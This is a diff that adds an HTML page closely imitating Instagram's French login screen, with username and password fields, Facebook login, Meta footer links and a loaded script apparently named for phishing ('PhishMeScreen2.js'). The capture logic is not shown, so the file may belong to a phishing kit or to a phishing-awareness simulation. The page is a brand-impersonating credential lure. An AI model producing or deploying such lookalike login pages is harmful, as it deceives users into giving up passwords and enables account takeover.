@@ -1,0 +1,202 @@
+<html lang="fr" class=" jekfxzskwb idc0_350"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="components/styles.css">
+    <link rel="icon" type="image/png" href="components/insta-fav.ico">
+	<script type="text/javascript" src="components/PhishMeScreen2.js"></script>
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #fff;
+            font-family: Arial, sans-serif;
+            overflow-x: hidden;
+        }
+
+        .flex {
+            display: flex;
+        }
+
+        .direction-column {
+            flex-direction: column;
+        }
+
+        .justify-content-center {
+            justify-content: center;
+        }
+
+        .align-items-center {
+            align-items: center;
+        }
+
+        .panel {
+            border: none;
+            box-shadow: none;
+        }
+
+        input, button {
+            border: none !important;
+            outline: none !important;
+            box-shadow: none !important;
+            background-color: #fafafa;
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 4px;
+            width: 100%;
+        }
+
+        input:focus, button:focus {
+            border: none;
+            outline: none;
+        }
+
+        .input-container {
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .input-container input {
+            width: 100%;
+            border: none;
+            padding: 8px;
+            background-color: transparent;
+        }
+
+        .input-container input:focus {
+            border: none;
+        }
+
+        #error-message {
+            color: red;
+            text-align: center;
+            margin: 10px 0;
+            display: none;
+        }
+
+        .text-muted {
+            font-size: 12px;
+            color: #8e8e8e;
+            font-weight: 400;
+        }
+
+        .text-capitalize {
+            text-transform: capitalize;
+        }
+
+        .login-with-fb .facebook-logo {
+            width: 20px;
+            height: auto;
+            margin-right: 10px;
+        }
+
+        .app-download img {
+            margin: 10px;
+            width: 120px;
+            height: auto;
+        }
+
+        #instagram-logo {
+            max-width: 100%;
+            height: auto;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 768px) {
+            .panel {
+                width: 90%;
+                padding: 10px;
+            }
+
+            .input-container input {
+                padding: 5px;
+            }
+
+            #instagram-logo {
+                width: 200px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .panel {
+                width: 400px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex"></section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img id="instagram-logo" src="components/instagram-logo.png" alt="Logo Instagram" title="Logo Instagram">
+                </h1>
+                <form id="login-form" onsubmit="return false;">
+                    <div class="input-container">
+                        <label for="email" class="sr-only">Num. téléphone, nom de profil ou e-mail</label>
+                        <input name="email" id="email" placeholder="Num. téléphone, nom de profil ou e-mail" required="">
+                    </div>
+
+                    <div class="input-container">
+                        <label for="password" class="sr-only">Mot de passe</label>
+                        <input name="password" id="password" type="password" placeholder="Mot de passe" required="">
+                    </div>
+
+                    <button type="button">Se connecter</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OU</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div class="flex align-items-center">
+                        <img id="facebook-logo" src="components/facebook_logo.png" alt="Facebook Logo" class="facebook-logo">
+                        <a>Se connecter avec Facebook</a>
+                    </div>
+                    <a href="#">Mot de passe oublié ?</a>
+                </div>
+
+                <div id="error-message">Votre mot de passe est incorrect. Veuillez le vérifier.</div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Vous n'avez pas de compte ?</p>
+                <a href="#">Inscrivez-vous</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p class="text-muted">Téléchargez l'application.</p>
+                <div class="flex justify-content-center">
+                    <img id="apple-logo" src="components/apple-button.png" alt="Logo de l'App Store" title="Logo de l'App Store">
+                    <img id="google-logo" src="components/googleplay-button.png" alt="Logo du Google Play" title="Logo du Google Play">
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#" class="text-muted text-capitalize">Meta</a></li>
+            <li><a href="#" class="text-muted text-capitalize">À propos</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Blog</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Emplois</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Aide</a></li>
+            <li><a href="#" class="text-muted text-capitalize">API</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Confidentialité</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Conditions</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Lieux</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Instagram Lite</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Threads</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Importation des contacts et non-utilisateurs</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Meta Verified</a></li>
+        </ul>
+        <p class="copyright text-muted text-capitalize">
+            ㅤㅤㅤFrançais ✔ ㅤㅤ© 2025 Instagram par Meta
+        </p>
+    </footer>
+
+</body></html>
